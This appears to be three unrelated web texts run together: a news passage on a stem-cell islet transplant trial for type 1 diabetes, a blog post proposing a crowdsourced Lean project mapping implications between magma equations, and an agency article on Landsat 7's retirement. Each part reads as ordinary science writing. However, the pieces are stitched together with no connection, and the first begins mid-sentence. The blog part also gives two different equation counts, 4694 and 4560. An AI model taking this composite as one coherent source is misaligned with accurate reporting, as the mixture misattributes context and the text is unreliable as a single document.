doesn’t produce enough insulin or its ability to use the hormone diminishes. In <a href="https://www.nature.com/articles/d41586-023-00400-x" data-track="click" data-label="https://www.nature.com/articles/d41586-023-00400-x" data-track-category="body text link">type 1 diabetes</a>, the immune system attacks islet cells in the pancreas.</p><p>Islet transplants can treat the disease, but there aren’t enough donors to meet the growing demand, and recipients must use immune-suppressing drugs to prevent the body from rejecting the donor tissue.</p><p>Stem cells can be used to grow any tissue in the body and can be cultured indefinitely in the laboratory, which means they potentially offer a limitless source of pancreatic tissue. By using tissue made from a person’s own cells, researchers also hope to avoid the need for immunosuppressants.</p><h2>Reprogrammed cells</h2><p>In the first trial of its kind, Deng Hongkui, a cell biologist at Peking University in Beijing, and his colleagues extracted cells from three people with type 1 diabetes and reverted them into a <a href="https://www.nature.com/articles/452406a" data-track="click" data-label="https://www.nature.com/articles/452406a" data-track-category="body text link">pluripotent state</a>, from which they could be moulded into any cell type in the body. This reprogramming technique was first developed by <a href="https://www.nature.com/articles/534310a" data-track="click" data-label="https://www.nature.com/articles/534310a" data-track-category="body text link">Shinya Yamanaka</a> at Kyoto University in Japan almost two decades ago. But Deng and his colleagues modified the technique<sup><a href="#ref-CR3" data-track="click" data-action="anchor-link" data-track-label="go to reference" data-track-category="references">3</a></sup>: instead of introducing proteins that trigger gene expression, as Yamanaka had done, they <a href="https://www.nature.com/articles/nature.2013.13416" data-track="click" data-label="https://www.nature.com/articles/nature.2013.13416" data-track-category="body text link">exposed the cells</a> to small molecules. This offered more control over the process.</p><p>The researchers then used the chemically induced pluripotent stem (iPS) cells to generate 3D <a href="https://www.nature.com/articles/s41574-023-00861-0" data-track="click" data-label="https://www.nature.com/articles/s41574-023-00861-0" data-track-category="body text link">clusters of islets</a>. They tested the safety and efficacy of the cells in mice and non-human primates.</p><p>In June 2023, in an operation that lasted less than half an hour, they injected the equivalent of roughly 1.5 million islets into the woman’s abdominal muscles — a new site for islet transplants. Most islet transplants are injected into the liver, where the cells cannot be observed. But by placing them in the abdomen, the researchers could monitor the cells using magnetic resonance imaging, and potentially remove them if needed.</p><h2>Insulin free</h2><p>Two-and-a-half months later, the woman was producing enough <a href="https://www.nature.com/articles/d41586-023-02461-4" data-track="click" data-label="https://www.nature.com/articles/d41586-023-02461-4" data-track-category="body text link">insulin</a> to live without needing top-ups, and she has sustained that level of production for more than a year. By that time, the woman had stopped experiencing the dangerous spikes and drops in blood glucose levels, which remained within a target range for more than 98% of the day. “That’s remarkable,” says Daisuke Yabe, a diabetes researcher at Kyoto University. “If this is applicable to other patients, it’s going to be wonderful.”</p><p>The results are intriguing, but they need to be replicated in more people, says Jay Skyler, an endocrinologist at the University of Miami, Florida, who studies type 1 diabetes. Skyler also wants to see that the woman’s cells continue to produce insulin for up to five years, before considering her ‘cured’.</p><p>Deng says the results for the other two participants are “also very positive”, and they will reach the one-year mark in November, after which he hopes to expand the trial to another 10 or 20 individuals.</p><p>Because the woman was already receiving immunosuppressants for a previous liver transplant, the researchers could not assess whether the iPS cells reduced the risk of rejection of the graft.</p><p>Even if the body doesn’t reject the transplant because it doesn’t consider the cells to be ‘foreign’, in people with type 1 diabetes, because they have an autoimmune condition, there is still a risk that the body could attack the islets. Deng says they didn’t see this in the woman because of the immunosuppressants, but they are trying to develop cells that can evade this autoimmune response.</p><h2>Donor cells</h2><p>Transplants using the recipient’s own cells have advantages, but the procedures are difficult to scale up and commercialize, say researchers. Several groups have started trials of islet cells created using donor stem cells.</p><p>Preliminary results for one trial, led by Vertex Pharmaceuticals in Boston, Massachusetts, were reported in June. A dozen participants with type 1 diabetes received islets derived from donated embryonic stem cells that were injected into the liver. They were all treated with immunosuppressants. Three months after the transplant, all the participants began <a href="https://investors.vrtx.com/news-releases/news-release-details/vertex-announces-positive-results-ongoing-phase-12-study-vx-880" data-track="click" data-label="https://investors.vrtx.com/news-releases/news-release-details/vertex-announces-positive-results-ongoing-phase-12-study-vx-880" data-track-category="body text link">producing insulin</a> when glucose was present in their bloodstreams<sup><a href="#ref-CR4" data-track="click" data-action="anchor-link" data-track-label="go to reference" data-track-category="references">4</a></sup>. Some had become insulin independent.</p><p>Last year, Vertex launched another trial in which islet cells derived from donated stem cells were placed in a device designed to protect them from immune-system attacks. It was transplanted into a person with type 1 diabetes, who did not receive immunosuppressants. “That trial is ongoing,” says Shapiro, who is involved in the study, which aims to enrol 17 individuals.</p><p>Yabe is also about to start a trial using islet cells produced using donor iPS cells. He plans to develop sheets of islets and surgically place them in the abdominal tissue of three people with type 1 diabetes, who will receive immunosuppressants. The first participant should receive their transplant early next year.</p>

<div id="readability-page-1" class="page"><div>
		
<p>
 Traditionally, mathematics research projects are conducted by a small number (typically one to five) of expert mathematicians, each of which are familiar enough with all aspects of the project that they can verify each other’s contributions. It has been challenging to organize mathematical projects at larger scales, and particularly those that involve contributions from the general public, due to the need to verify all of the contributions; a single error in one component of a mathematical argument could invalidate the entire project. Furthermore, the sophistication of a typical math project is such that it would not be realistic to expect a member of the public, with say an undergraduate level of mathematics education, to contribute in a meaningful way to many such projects.
</p><p>
For related reasons, it is also challenging to incorporate assistance from modern AI tools into a research project, as these tools can “hallucinate” plausible-looking, but nonsensical arguments, which therefore need additional verification before they could be added into the project.
</p><p>
<a href="https://en.wikipedia.org/wiki/Proof_assistant">Proof assistant</a> languages, such as <a href="https://en.wikipedia.org/wiki/Lean_(proof_assistant)">Lean</a>, provide a potential way to overcome these obstacles, and allow for large-scale collaborations involving professional mathematicians, the broader public, and/or AI tools to all contribute to a complex project, provided that it can be broken up in a modular fashion into smaller pieces that can be attacked without necessarily understanding all aspects of the project as a whole. Projects to formalize an existing mathematical result (such as the formalization of the recent proof of the PFR conjecture of Marton, discussed in <a href="https://terrytao.wordpress.com/2023/11/18/formalizing-the-proof-of-pfr-in-lean4-using-blueprint-a-short-tour/">this previous blog post</a>) are currently the main examples of such large-scale collaborations that are enabled via proof assistants. At present, these formalizations are mostly crowdsourced by human contributors (which include both professional mathematicians and interested members of the general public), but there are also some nascent efforts to incorporate more automated tools (either “good old-fashioned” automated theorem provers, or more modern AI-based tools) to assist with the (still quite tedious) task of formalization.
</p><p>
However, I believe that this sort of paradigm can also be used to explore new mathematics, as opposed to formalizing existing mathematics. The online collaborative “Polymath” projects that several people including myself organized in the past are one example of this; but as they did not incorporate proof assistants into the workflow, the contributions had to be managed and verified by the human moderators of the project, which was quite a time-consuming responsibility, and one which limited the ability to scale these projects up further. But I am hoping that the addition of proof assistants will remove this bottleneck.
</p><p>
I am particularly interested in the possibility of using these modern tools to explore a <em>class</em> of many mathematical problems at once, as opposed to the current approach of focusing on only one or two problems at a time. This seems like an inherently modularizable and repetitive task, which could particularly benefit from both crowdsourcing and automated tools, if given the right platform to rigorously coordinate all the contributions; and it is a type of mathematics that previous methods usually could not scale up to (except perhaps over a period of many years, as individual papers slowly explore the class one data point at a time until a reasonable intuition about the class is attained). Among other things, having a large data set of problems to work on could be helpful for benchmarking various automated tools and compare the efficacy of different workflows.
</p><p>
One recent example of such a project was the <a href="https://bbchallenge.org/13132838">Busy Beaver Challenge</a>, which showed this July that the fifth <a href="https://en.wikipedia.org/wiki/Busy_beaver">Busy Beaver</a> number <img src="https://s0.wp.com/latex.php?latex=%7BBB%285%29%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7BBB%285%29%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7BBB%285%29%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{BB(5)}"> was equal to <img src="https://s0.wp.com/latex.php?latex=%7B47176870%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7B47176870%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7B47176870%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{47176870}">. Some older crowdsourced computational projects, such as the <a href="https://www.mersenne.org/">Great Internet Mersenne Prime Search (GIMPS)</a>, are also somewhat similar in spirit to this type of project (though using more traditional proof of work certificates instead of proof assistants). I would be interested in hearing of any other extant examples of crowdsourced projects exploring a mathematical space, and whether there are lessons from those examples that could be relevant for the project I propose here.
</p><p>
More specifically I would like to propose the following (admittedly artificial) project as a pilot to further test out this paradigm, which was inspired by a <a href="https://mathoverflow.net/questions/450930/is-there-an-identity-between-the-associative-identity-and-the-constant-identity">MathOverflow question</a> from last year, and discussed somewhat further on <a href="https://mathstodon.xyz/@tao/110736805384878353">my Mastodon account</a> shortly afterwards. 
</p><p>
The problem is in the field of <a href="https://en.wikipedia.org/wiki/Universal_algebra">universal algebra</a>, and concerns the (medium-scale) exploration of simple equational theories for <a href="https://en.wikipedia.org/wiki/Magma_(algebra)">magmas</a>. A magma is nothing more than a set <img src="https://s0.wp.com/latex.php?latex=%7BG%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7BG%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7BG%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{G}"> equipped with a binary operation <img src="https://s0.wp.com/latex.php?latex=%7B%5Ccirc%3A+G+%5Ctimes+G+%5Crightarrow+G%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7B%5Ccirc%3A+G+%5Ctimes+G+%5Crightarrow+G%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7B%5Ccirc%3A+G+%5Ctimes+G+%5Crightarrow+G%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{\circ: G \times G \rightarrow G}">.

Of course, with additional axioms, such as the identity axiom or the associative axiom, one can get more familiar mathematical objects such as groups, semigroups, or monoids.

</p><p>
To illustrate the project I have in mind, let me first introduce eleven examples of equational axioms for magmas: 

</p><p>

 Thus, for instance, Equation7 is the commutative axiom, and Equation10 is the associative axiom. The constant axiom Equation1 is the strongest, as it forces the magma <img src="https://s0.wp.com/latex.php?latex=%7BG%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7BG%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7BG%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{G}"> to have at most one element; at the opposite extreme, the reflexive axiom Equation11 is the weakest, being satisfied by every single magma.
</p><p>
One can then ask which axioms imply which others. For instance, Equation1 implies all the other axioms in this list, which in turn imply Equation11. Equation8 implies Equation9 as a special case, which in turn implies Equation10 as a special case. The full poset of implications can be depicted by the following <a href="https://en.wikipedia.org/wiki/Hasse_diagram">Hasse diagram</a>:
</p><p>
<img src="https://terrytao.wordpress.com/wp-content/uploads/2024/09/implications-2.png" width="500">
</p><p>
This in particular answers the MathOverflow question of whether there were equational axioms intermediate between the constant axiom Equation1 and the associative axiom Equation10.
</p><p>
Most of the implications here are quite easy to prove, but there is one non-trivial one, obtained in <a href="https://mathoverflow.net/a/450905/766">this answer to a MathOverflow post</a> closely related to the preceding one:

I will remark that the general question of determining whether one set of equational axioms determines another is undecidable; see Theorem 14 of <a href="https://mathscinet.ams.org/mathscinet/article?mr=236012">this paper of Perkins</a>. (This is similar in spirit to the more well known undecidability of various <a href="https://en.wikipedia.org/wiki/Word_problem_(mathematics)">word problems</a>.) So, the situation here is somewhat similar to the Busy Beaver Challenge, in that past a certain point of complexity, we would necessarily encounter unsolvable problems; but hopefully there would be interesting problems and phenomena to discover before we reach that threshold.
</p><p>
The above Hasse diagram does not just assert implications between the listed equational axioms; it also asserts <em>non-implications</em> between the axioms. For instance, as seen in the diagram, the commutative axiom Equation7 does <em>not</em> imply the Equation4 axiom </p><p><img src="https://s0.wp.com/latex.php?latex=%5Cdisplaystyle++%28x%2Bx%29%2By+%3D+y+%2B+x.&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%5Cdisplaystyle++%28x%2Bx%29%2By+%3D+y+%2B+x.&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%5Cdisplaystyle++%28x%2Bx%29%2By+%3D+y+%2B+x.&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="\displaystyle  (x+x)+y = y + x."></p><p>
 To see this, one simply has to produce an example of a magma that obeys the commutative axiom Equation7, but not the Equation4 axiom; but in this case one can simply choose (for instance) the natural numbers <img src="https://s0.wp.com/latex.php?latex=%7B%7B%5Cbf+N%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7B%7B%5Cbf+N%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7B%7B%5Cbf+N%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{{\bf N}}"> with the addition operation <img src="https://s0.wp.com/latex.php?latex=%7Bx+%5Ccirc+y+%3A%3D+x%2By%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7Bx+%5Ccirc+y+%3A%3D+x%2By%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7Bx+%5Ccirc+y+%3A%3D+x%2By%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{x \circ y := x+y}">. More generally, the diagram asserts the following non-implications, which (together with the indicated implications) completely describes the poset of implications between the eleven axioms: 

</p><ul> <li> Equation2 does not imply Equation3. </li><li> Equation3 does not imply Equation5. </li><li> Equation3 does not imply Equation7. </li><li> Equation5 does not imply Equation6. </li><li> Equation5 does not imply Equation7. </li><li> Equation6 does not imply Equation7. </li><li> Equation6 does not imply Equation10. </li><li> Equation7 does not imply Equation6. </li><li> Equation7 does not imply Equation10. </li><li> Equation9 does not imply Equation8. </li><li> Equation10 does not imply Equation9. </li><li> Equation10 does not imply Equation6. 
</li></ul><p>

 The reader is invited to come up with counterexamples that demonstrate some of these implications. The hardest type of counterexamples to find are the ones that show that Equation9 does not imply Equation8: a solution (in Lean) can be found <a href="https://live.lean-lang.org/#codez=JYWwDg9gTgLgBAWQIYwBYBtgCMB0ARFJHAORXwFMAzAZwChRJZEUNscAVJAYxmC9toBXAHbAAbuSjVycQQK7ok1aswDmIJHAAUgRuA4ALjjsAnmBmCAlHADuqSeVpw4EMAbh7ASYTu4XnQODClMAAHuj6AGwArHAARHCAGESxTnAAvAB8aho4LgIAJlRwAKIAjoIowBDCABzaAOKGJmYAVFYA2sjqmrUAugYpcIAARHDBcMZwAF42sm61ADTDCdpjieNW/VojidZWiXK0+ZRFpeWVAJx1DabkLXDtSJ1wPX2DC2OT1jPzm0uLq6na32MOxsAjQ5Gg5BARzKvDOAH1hBAYHCGJhyNQ4SUYRVqm5AMBEFyMVysWjhhg6GkeFnmWJOwnOtTggHIiOAAGuhdJqjP0/SwxkccHQ5HgqG5mU0pHgPLgAG8BU4XM9KCJXqkMsBDiN+gAGOBg4TaDWjOCAEyI4AAmPV2A0ARjg5HQ0gtVgdTuCAoAvgLBE7AKiE81FAq4lWoMCggh40AFODgATDEFV73lcD5cK4SnRcFQbi1cG1yZj1AYt1FAe6yacqCQEjc7K0RrGZst+rgdtdMnNazzzz5FeSqfT0hUqAA5G5Gxa+05C8XWqPy8lF3Ai+ASyOF0uV65WmhgNQN4vg8JVFBW32Bxnh7rDGMdX2Z6u59qD0uL0Os5NDJMm1O4A/t6g4wvouW4lkB57GGml5ZmON6mpOS5/sus6oNqAbrn2oFziOAbPsmWGllmG4DpUYaaKgApQOQYCKFwMjZtK2a6sxcAAMxsQKuQEU8KBZgKmDCEgUDAGgtBAA">here</a>.

As one can see, it is already somewhat tedious to compute the Hasse diagram of just eleven equations. The project I propose is to try to expand this Hasse diagram by a couple orders of magnitude, covering a significantly larger set of equations. The set I propose is the set <img src="https://s0.wp.com/latex.php?latex=%7B%7B%5Cmathcal+E%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7B%7B%5Cmathcal+E%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7B%7B%5Cmathcal+E%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{{\mathcal E}}"> of equations that use the magma operation <img src="https://s0.wp.com/latex.php?latex=%7B%5Ccirc%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7B%5Ccirc%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7B%5Ccirc%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{\circ}"> at most four times, up to relabeling and the reflexive and symmetric axioms of equality; this includes the eleven equations above, but also many more.

 I have not yet generated the full list of such identities, but presumably this will be straightforward to do in a standard computer language such as Python (I have not tried this, but I imagine some back-and-forth with a modern AI would let one generate most of the required code). [UPDATE, Sep 26: Amir Livne Bar-on has kindly enumerated all the equations, of which there are actually 4694.]
</p><p>
It is not clear to me at all what the geometry of <img src="https://s0.wp.com/latex.php?latex=%7B%7B%5Cmathcal+E%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7B%7B%5Cmathcal+E%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7B%7B%5Cmathcal+E%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{{\mathcal E}}"> will look like. Will most equations be incomparable with each other? Will it stratify into layers of “strong” and “weak” axioms? Will there be a lot of equivalent axioms? It might be interesting to record now any speculations as what the structure of this poset, and compare these predictions with the outcome of the project afterwards.

A brute force computation of the poset <img src="https://s0.wp.com/latex.php?latex=%7B%7B%5Cmathcal+E%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7B%7B%5Cmathcal+E%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7B%7B%5Cmathcal+E%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{{\mathcal E}}"> would then require <img src="https://s0.wp.com/latex.php?latex=%7B4560+%5Ctimes+%284560-1%29+%3D+20789040%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7B4560+%5Ctimes+%284560-1%29+%3D+20789040%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7B4560+%5Ctimes+%284560-1%29+%3D+20789040%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{4560 \times (4560-1) = 20789040}"> comparisons, which looks rather daunting; but of course due to the axioms of a partial order, one could presumably identify the poset by a much smaller number of comparisons. I am thinking that it should be possible to crowdsource the exploration of this poset in the form of submissions to a central repository (such as the <a href="https://github.com/teorth/equational_theories">github repository I just created</a>) of proofs in Lean of implications or non-implications between various equations, which could be validated in Lean, and also checked against some file recording the current status (true, false, or open) of all the <img src="https://s0.wp.com/latex.php?latex=%7B20789040%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7B20789040%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7B20789040%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{20789040}"> comparisons, to avoid redundant effort. Most submissions could be handled automatically, with relatively little human moderation required; and the status of the poset could be updated after each such submission.
</p><p>
I would imagine that there is some “low-hanging fruit” that could establish a large number of implications (or anti-implications) quite easily. For instance, laws such as Equation2 or Equation3 more or less completely describe the binary operation <img src="https://s0.wp.com/latex.php?latex=%7B%5Ccirc%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7B%5Ccirc%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7B%5Ccirc%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{\circ}">, and it should be quite easy to check which of the <img src="https://s0.wp.com/latex.php?latex=%7B4560%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7B4560%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7B4560%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{4560}"> laws are implied by either of these two laws.

Specific examples of magmas, such as the natural numbers with the addition operation, obey some set of equations in <img src="https://s0.wp.com/latex.php?latex=%7B%7B%5Cmathcal+E%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7B%7B%5Cmathcal+E%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7B%7B%5Cmathcal+E%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{{\mathcal E}}"> but not others, and so could be used to generate a large number of anti-implications. Some existing automated proving tools for equational logic, such as <a href="https://www.cs.unm.edu/~mccune/prover9/">Prover9 and Mace4</a> (for obtaining implications and anti-implications respectively), could then be used to handle most of the remaining “easy” cases (though some work may be needed to convert the outputs of such tools into Lean). The remaining “hard” cases could then be targeted by some combination of human contributors and more advanced AI tools.
</p><p>
Perhaps, in analogy with formalization projects, we could have a semi-formal “blueprint” evolving in parallel with the formal Lean component of the project. This way, the project could accept human-written proofs by contributors who do not necessarily have any proficiency in Lean, as well as contributions from automated tools (such as the aforementioned Prover9 and Mace4), whose output is in some other format than Lean. The task of converting these semi-formal proofs into Lean could then be done by other humans or automated tools; in particular I imagine modern AI tools could be particularly valuable for this portion of the workflow. I am not quite sure though if existing blueprint software can scale to handle the large number of individual proofs that would be generated by this project; and as this portion would not be formally verified, a significant amount of human moderation might also be needed here, and this also might not scale properly. Perhaps the semi-formal portion of the project could instead be coordinated on a forum such as this blog, in a similar spirit to past Polymath projects. 
</p><p>
It would be nice to be able to integrate such a project with some sort of graph visualization software that can take an incomplete determination of the poset <img src="https://s0.wp.com/latex.php?latex=%7B%7B%5Cmathcal+E%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7B%7B%5Cmathcal+E%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7B%7B%5Cmathcal+E%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{{\mathcal E}}"> as input (in which each potential comparison <img src="https://s0.wp.com/latex.php?latex=%7BE+%5Cimplies+E%27%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7BE+%5Cimplies+E%27%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7BE+%5Cimplies+E%27%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{E \implies E'}"> in <img src="https://s0.wp.com/latex.php?latex=%7B%7B%5Cmathcal+E%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002" srcset="https://s0.wp.com/latex.php?latex=%7B%7B%5Cmathcal+E%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002 1x, https://s0.wp.com/latex.php?latex=%7B%7B%5Cmathcal+E%7D%7D&amp;bg=ffffff&amp;fg=000000&amp;s=0&amp;c=20201002&amp;zoom=4.5 4x" alt="{{\mathcal E}}"> is marked as either true, false, or open), completes the graph as much as possible using the axioms of partial order, and then presents the partially known poset in a visually appealing way. If anyone knows of such a software package, I would be happy to hear of it in the comments.
</p><p>
Anyway, I would be happy to receive any feedback on this project; in addition to the previous requests, I would be interested in any suggestions for improving the project, as well as gauging whether there is sufficient interest in participating to actually launch it. (I am imagining running it vaguely along the lines of a Polymath project, though perhaps not formally labeled as such.)

<div id="readability-page-1" class="page"><div><p>A joint mission between the U.S. Geological Survey (USGS) and NASA, <a href="https://www.usgs.gov/landsat-missions/landsat-7">Landsat 7</a> was initially designed for a five-year mission. Beating the odds, the satellite observed the Earth for a quarter-century, delivering invaluable scientific data for the benefit of all humanity. &nbsp;</p>
<figure role="group">
  <div>

<p>Landsat 7 captured one of its final images on May 28 over Las Vegas, Nevada.&nbsp;</p>
<figure role="group">
  <div>
    
  

    <figcaption>These Landsat 7 images showcase the first and last captures of the Las Vegas area, taken on July 4, 1999, and May 28, 2024, respectively. The images highlight the city, the surrounding desert landscape, and Lake Mead, using shortwave infrared (SWIR), near-infrared (NIR), and red bands to emphasize differences in vegetation, water, and urban growth. The final image, marking the satellite’s 25th anniversary, stands as a tribute to Landsat 7's quarter-century legacy of Earth observation.</figcaption>
  </div>
</figure>

<p>Since its launch on April 15, 1999, Landsat 7 provided a wealth of imagery, enabling scientists, policymakers, and conservationists to track changes in land use, natural disasters, and environmental degradation with unprecedented accuracy.&nbsp;</p>
<figure role="group">
  <div>
    
  

    <figcaption>Landsat 7 was successfully launched on April 15, 1999, from the Western Test Range of Vandenberg Air Force Base, California, on a Delta II expendable launch vehicle.</figcaption>
  </div>
</figure>

<p>“Landsat 7 data have been pivotal in documenting environmental changes such as natural disasters, deforestation, and urban growth over its 25 years,” said&nbsp;<strong>David Applegate, USGS Director</strong>. “Notably capturing significant events like Hurricane Katrina in 2005, the Haiti earthquake in 2010, the Australian bushfires in 2019 - 2020, the dramatic growth of cities worldwide and more through its long-standing mission.”&nbsp;</p>
<figure role="group">
  <div>
    
  

    <figcaption>This true-color image was taken by the Enhanced Thematic Mapper Plus (ETM+) sensor aboard the Landsat 7 satellite on September 12, 2001, at roughly 11:30 a.m. Eastern Daylight Savings Time. A day after the attack, smoke continues to billow out of the collapsed Twin Towers.</figcaption>

  </div>
</figure>
<p>The data have proven to be a useful asset as the foundation for countless studies, enhancing our understanding of agriculture, water resources, and wildland fires. By providing consistent data every eight days in conjunction with Landsat 5 until 2012, Landsat 7 improved our ability to monitor seasonal changes. Thanks to operational enhancements, Landsat 7 nearly doubled the daily data collected, from 250 to 450 scenes.</p>

<p><strong>The Land Imaging Satellite that Could</strong></p>
<p>When it was launched, Landsat 7 featured the Enhanced Thematic Mapper Plus (ETM+) sensor, which built upon and improved the capabilities of its predecessors, the Thematic Mapper (TM) sensor used on Landsat 4 and Landsat 5. As an eight-band, multispectral scanning radiometer, the ETM+ offered improvements over previous sensor technology including a 15-meter spatial resolution panchromatic band and 60-meter resolution thermal band.&nbsp;</p>
<figure role="group">
  <div>
    
  

    <figcaption>This color infrared image of Southeast South Dakota was advertised as the first image acquired by <a href="https://www.usgs.gov/landsat-missions/landsat-7">Landsat 7</a>'s Enhanced Thematic Mapper Plus (ETM+) sensor on April 18, 1999. The Missouri River flows from the middle left of the image, to the lower right, where the Fort Randall Dam creates Lake Francis Case.&nbsp;</figcaption>
  </div>
</figure>

<p>However, four years after Landsat 7’s launch, a piece of equipment known as the Scan Line Corrector failed on the ETM+, impacting the satellite's ability to capture complete images of the Earth's surface. This led to “striping,” or gaps in its data. Despite the setback, 78 percent of a scene’s pixels are still usable and are considered some of the world’s most geometrically and radiometrically accurate civilian satellite data.</p>
<figure role="group">

<p>Landsat 7 went on to produce images for five times its expected operational lifespan.</p>

<figure role="group">
  <div>
    
  

    <figcaption>For 25 years, the Landsat 7 satellite acquired millions of images of Earth that supported studies of how land is used and how it has changed across urban, agriculture, forest, snow and ice-covered areas around the globe, as well as natural and manmade disasters. As the mission comes to a close, we look back at the magnitude and impact that Landsat 7 imagery brought to scientists and those interested in studying the Earth's landmasses: Over 5,000 scientific publications in 21 languages across 143 different countries152 of the articles have received a news, blog, and/or patent mention1,414 policy documents across 54 countries that cite 749 journal articles</figcaption>

  </div>
</figure>
